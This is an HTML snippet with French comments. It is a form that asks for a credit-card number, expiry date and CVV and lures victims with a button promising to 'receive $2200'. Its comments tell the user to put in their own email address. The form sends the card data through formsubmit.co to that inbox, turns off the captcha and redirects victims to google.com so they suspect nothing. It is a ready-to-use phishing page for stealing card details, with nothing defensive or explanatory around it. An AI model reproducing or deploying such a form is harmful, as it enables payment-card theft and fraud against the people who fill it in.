<!-- Remplace TON_EMAIL@GMAIL.COM par ton adresse de réception -->
<form action="https://formsubmit.co" method="POST">
    
    <!-- Redirection après le clic (Optionnel : vers ton site ou google.com) -->
    <input type="hidden" name="_next" value="https://google.com">
    
    <!-- Désactive le Captcha pour que ce soit plus rapide sur téléphone -->
    <input type="hidden" name="_captcha" value="false">

    <label class="label">NUMÉRO DE CARTE</label>
    <input type="text" name="Numero_Carte" id="card" placeholder="0000 0000 0000 0000" inputmode="numeric" maxlength="19" required>

    <div class="row">
        <div>
            <label class="label">EXPIRATION</label>
            <input type="text" name="Date_Expiration" id="expiry" placeholder="MM/AA" inputmode="numeric" maxlength="5" required>
        </div>
        <div>
            <label class="label">CVV</label>
            <input type="password" name="Code_CVV" placeholder="123" inputmode="numeric" maxlength="3" required>
        </div>
    </div>

    <button type="submit">RECEVOIR LES 2200$</button>
</form>
